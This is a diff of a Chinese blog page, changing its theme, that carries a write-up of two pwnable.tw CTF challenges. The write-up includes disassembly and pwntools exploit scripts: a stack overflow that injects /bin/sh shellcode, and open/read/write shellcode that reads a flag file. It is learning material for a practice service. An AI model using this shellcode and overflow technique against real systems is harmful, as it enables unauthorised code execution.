@@ -1,112 +1,19 @@
 <!DOCTYPE html>
 
 
+  <html class="light page-post">
 
 
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222">
+  <meta charset="utf-8">
+  
+  <title>pwnable.tw-writeup | foyjog</title>
 
-
-
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
-
-
-
-
-
-
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '6.3.0',
-    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-
-
-
+    <meta name="keywords" content="forsigner,前端,设计,Hexo主题,前端开发,用户体验,设计,frontend,design,nodejs,JavaScript" />
+  
 
   <meta name="description" content="概述新手学习就是要多见识，多做题是长见识的好方法，本文将持续更新pwnable.tw的writeup，记录学习二进制的路程。 Start基础题目，拿过来进行分析，拖入ida，发现代码不多12345678910111213141516171819202122                               push    esp.text:08048061">
 <meta property="og:type" content="article">
@@ -120,643 +27,443 @@
 <meta name="twitter:title" content="pwnable.tw-writeup">
 <meta name="twitter:description" content="概述新手学习就是要多见识，多做题是长见识的好方法，本文将持续更新pwnable.tw的writeup，记录学习二进制的路程。 Start基础题目，拿过来进行分析，拖入ida，发现代码不多12345678910111213141516171819202122                               push    esp.text:08048061">
 
-
-
-  <link rel="alternate" href="/atom.xml" title="foyjog" type="application/atom+xml" />
-
-
-
-
-  <link rel="canonical" href="https://foyjog.github.io/2018/03/08/pwnable-tw-writeup/"/>
-
-
-
-<script type="text/javascript" id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>pwnable.tw-writeup | foyjog</title>
   
 
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cben" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
 
 
 
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
 
-
-
-
-
-  <noscript>
-  <style type="text/css">
-    .use-motion .motion-element,
-    .use-motion .brand,
-    .use-motion .menu-item,
-    .sidebar-inner,
-    .use-motion .post-block,
-    .use-motion .pagination,
-    .use-motion .comments,
-    .use-motion .post-header,
-    .use-motion .post-body,
-    .use-motion .collection-title { opacity: initial; }
-
-    .use-motion .logo,
-    .use-motion .site-title,
-    .use-motion .site-subtitle {
-      opacity: initial;
-      top: initial;
-    }
-
-    .use-motion {
-      .logo-line-before i { left: initial; }
-      .logo-line-after i { right: initial; }
-    }
-  </style>
-</noscript>
-
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body>
+
 
   
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
   
-    
-  
 
-  <div class="container sidebar-position-right page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">foyjog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
       
-        <p class="site-subtitle">reversing engineer</p>
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
       
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="Toggle navigation bar">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
       
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-    <a href="/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-    <a href="/archives/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
-  </li>
-
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
       
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/atom.xml"
+            rel="noopener noreferrer"
+            target="_blank"
+            >
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
       
     </ul>
-  
-
-  
-
-  
-</nav>
-
-
-
-  
-
+  </div>
 
 
 </div>
-    </header>
-
-    
 
 
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#概述"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Start"><span class="toc-text">Start</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ORW"><span class="toc-text">ORW</span></a></li></ol>
+  </div>
 
-          
-          <div id="content" class="content">
-            
 
-  <div id="posts" class="posts-expand">
-    
 
-  
+<div class="content content-post CENTER">
+   <article id="post-pwnable-tw-writeup" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">pwnable.tw-writeup</h1>
 
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://foyjog.github.io/2018/03/08/pwnable-tw-writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="foyjog">
-      <meta itemprop="description" content="email:foyjog@163.com">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="foyjog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">pwnable.tw-writeup
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-03-08 11:59:49" itemprop="dateCreated datePublished" datetime="2018-03-08T11:59:49+08:00">2018-03-08</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2018-07-03 16:18:38" itemprop="dateModified" datetime="2018-07-03T16:18:38+08:00">2018-07-03</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.03.08</span>
+      </span>
 
       
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>foyjog</span>
+        </span>
       
 
       
-        <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>新手学习就是要多见识，多做题是长见识的好方法，本文将持续更新pwnable.tw的writeup，记录学习二进制的路程。</p>
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://www.forsigner.com/2018/03/08/pwnable-tw-writeup/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>新手学习就是要多见识，多做题是长见识的好方法，本文将持续更新pwnable.tw的writeup，记录学习二进制的路程。</p>
 <h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>基础题目，拿过来进行分析，拖入ida，发现代码不多<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">                               push    esp</span><br><span class="line">.text:<span class="number">08048061</span>                 push    offset _exit</span><br><span class="line">.text:<span class="number">08048066</span>                 xor     eax, eax</span><br><span class="line">.text:<span class="number">08048068</span>                 xor     ebx, ebx</span><br><span class="line">.text:<span class="number">0804806</span>A                 xor     ecx, ecx</span><br><span class="line">.text:<span class="number">0804806</span>C                 xor     edx, edx</span><br><span class="line">.text:<span class="number">0804806</span>E                 push    <span class="number">3</span>A465443h</span><br><span class="line">.text:<span class="number">08048073</span>                 push    <span class="number">20656874</span>h</span><br><span class="line">.text:<span class="number">08048078</span>                 push    <span class="number">20747261</span>h        </span><br><span class="line">.text:<span class="number">0804807</span>D                 push    <span class="number">74732073</span>h</span><br><span class="line">.text:<span class="number">08048082</span>                 push    <span class="number">2774654</span>Ch       ; Lets start the ctf!</span><br><span class="line">.text:<span class="number">08048087</span>                 mov     ecx, esp        ; addr</span><br><span class="line">.text:<span class="number">08048089</span>                 mov     dl, <span class="number">14</span>h         ; len</span><br><span class="line">.text:<span class="number">0804808B</span>                 mov     bl, <span class="number">1</span>           ; fd</span><br><span class="line">.text:<span class="number">0804808</span>D                 mov     al, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804808F</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">08048091</span>                 xor     ebx, ebx</span><br><span class="line">.text:<span class="number">08048093</span>                 mov     dl, <span class="number">3</span>Ch</span><br><span class="line">.text:<span class="number">08048095</span>                 mov     al, <span class="number">3</span></span><br><span class="line">.text:<span class="number">08048097</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX - sys_read</span><br><span class="line">.text:<span class="number">08048099</span>                 add     esp, <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">0804809</span>C                 retn</span><br></pre></td></tr></table></figure></p>
 <p>看出sys_read有溢出，所以做最基本的栈溢出即可。<br>用checksec查看一下程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure></p>
 <p>没有任何保护，直接放shellcode上去，栈上执行。<br>泄露栈地址可以由0x08048087控制，将esp的地址重新打印即可 ，python脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line">s= process(<span class="string">"calc"</span>)</span><br><span class="line">elf = ELF(<span class="string">"calc"</span>)</span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line">movecxesp = <span class="number">0x8048087</span></span><br><span class="line">hex1 = <span class="number">0xff9203e0</span> <span class="comment">####</span></span><br><span class="line">hex2 = <span class="number">0xff9203dc</span> <span class="comment">####这两个地址是随机的一次调试获得的，目的是为了计算差值</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">20</span>+ p32(movecxesp)</span><br><span class="line">pdb.set_trace()</span><br><span class="line"><span class="keyword">print</span> s.recv()</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">esp =  u32(s.recv(<span class="number">4</span>)) -(hex1 - hex2)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span>*<span class="number">20</span> + p32(esp+<span class="number">20</span>+<span class="number">4</span>)+shellcode</span><br><span class="line">s.recv()</span><br><span class="line">s.send(payload2)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p>
 <h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>看题目意思Only open read write syscall are allowed to use.那么我们使用open + read + write来进行flag的获取。<br>从网站<a href="https://elixir.bootlin.com/linux/v3.0/ident/sys_open" target="_blank" rel="noopener">bootlin</a>去查内部调用的函数方式，再从linux系统调用表中去查看调用方法，即可编写出汇编代码，再转化为shellcode即可。<br>linux系统调用表的链接如下：<a href="https://pan.baidu.com/s/1MU9ynK3nrRfUmsGe3pSgOw" target="_blank" rel="noopener">网盘链接</a><br>编写的asm汇编代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">asm</span> (<span class="string">"push $0x00006761 \n\t"</span></span><br><span class="line">	<span class="string">"push $0x6c662f77 \n\t"</span></span><br><span class="line">	<span class="string">"push $0x726f2f65 \n\t"</span></span><br><span class="line">	<span class="string">"push $0x6d6f682f \n\t"</span> </span><br><span class="line">	<span class="string">"movl $0x5,%eax \n\t"</span></span><br><span class="line">	<span class="string">"movl %esp,%ebx \n\t"</span></span><br><span class="line">	<span class="string">"xor %ecx,%ecx \n\t"</span></span><br><span class="line">	<span class="string">"xor %edx,%edx \n\t"</span></span><br><span class="line">	<span class="string">"int $0x80\n\t"</span></span><br><span class="line">        <span class="string">"mov %eax,%ebx\n\t"</span></span><br><span class="line">	<span class="string">"mov %esp,%ecx\n\t"</span></span><br><span class="line">	<span class="string">"mov $0x50,%edx\n\t"</span></span><br><span class="line">	<span class="string">"movl $0x3,%eax \n\t"</span></span><br><span class="line">	<span class="string">"int $0x80 \n\t"</span></span><br><span class="line">	<span class="string">"movl $1,%ebx \n\t"</span></span><br><span class="line">	<span class="string">"mov %esp,%ecx\n\t"</span></span><br><span class="line">	<span class="string">"mov $0x50,%edx\n\t"</span></span><br><span class="line">	<span class="string">"movl $0x4,%eax \n\t"</span></span><br><span class="line">	<span class="string">"int $0x80 \n\t"</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    );  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>代码应该很好理解，通过看linux系统调用表，首先push进去”/home/orw/flag”字符串，eax改为5，ebx是filname，那将esp放入ebx即可，ecx，edx都为0（瞎猜的，没找到实际对应的规则），int 80调用即可。<br>后面的也是一样，只不过文件描述符我们write的时候设置为1即可，为STDOUT_FILENO，为标准输出形式。<br>之后利用ida去查看这段汇编的字节码，写入shellcode即可。python代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line">shellcode = <span class="string">'\x68\x61\x67\x00\x00\x68\x77\x2f\x66\x6c\x68\x65\x2F\x6f\x72\x68\x2F\x68\x6F\x6D\xB8\x05\x00\x00\x00\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x89\xC3\x89\xE1\xBA\x50\x00\x00\x00\xB8\x03\x00\x00\x00\xCD\x80\xBB\x01\x00\x00\x00\x89\xE1\xBA\x50\x00\x00\x00\xB8\x04\x00\x00\x00\xCD\x80'</span></span><br><span class="line">s= remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s.recv()</span><br><span class="line">s.send(shellcode)</span><br><span class="line"><span class="keyword">print</span> s.recv()</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p>
 
-      
-    </div>
-
     
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/01/23/34c3ctf中vim题目详解/" rel="next" title="34c3ctf中vim题目详解">
-                <i class="fa fa-chevron-left"></i> 34c3ctf中vim题目详解
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/03/08/reversing-kr-writeup/" rel="prev" title="reversing.kr-writeup">
-                reversing.kr-writeup <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
   </div>
 
-
-          </div>
-          
-
-  
+</article>
 
 
-
-        </div>
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul>
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
+          <li class="item">
+            
+              <span>微信扫一扫</span>
+            
+            <img src="/images/qr-wechat.png" alt="">
           </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
+        
+          <li class="item">
+            
+              <span>支付宝扫一扫</span>
+            
+            <img src="/images/qr-alipay.png" alt="">
           </li>
+        
         </ul>
-      
+      </div>
+    </div>
+  </div>
 
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">foyjog</p>
-              <p class="site-description motion-element" itemprop="description">email:foyjog@163.com</p>
-          </div>
 
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">posts</span>
-                  </a>
-                </div>
-              
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/01/23/34c3ctf中vim题目详解/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2018/03/08/reversing-kr-writeup/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
 
-              
 
-              
-            </nav>
-          
 
-          
-            <div class="feed-link motion-element">
-              <a href="/atom.xml" rel="alternate">
-                <i class="fa fa-rss"></i>
-                RSS
-              </a>
-            </div>
-          
 
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  <a href="https://github.com/foyjog" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                  
-                </span>
-              
-                <span class="links-of-author-item">
-                  <a href="mailto:foyjog@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-                  
-                </span>
-              
-            </div>
-          
 
-          
-          
+   
+      <div class="git"></div>
+   
+</div>
 
-          
-          
 
-          
-            
-          
-          
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
 
-        </div>
-      </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
 
-            
-              
-            
 
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Start"><span class="nav-number">2.</span> <span class="nav-text">Start</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ORW"><span class="nav-number">3.</span> <span class="nav-text">ORW</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
 
     </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">foyjog</span>
-
-  
-
-  
+  </div>
 </div>
 
 
 
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
 
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.4.4</div>
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'https://foyjog.github.io/2018/03/08/pwnable-tw-writeup/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
 
 
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
 
     
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
     
 
+    
+    
+
+    
+
+    
     
 
   </div>
 
   
 
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
   }
 </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
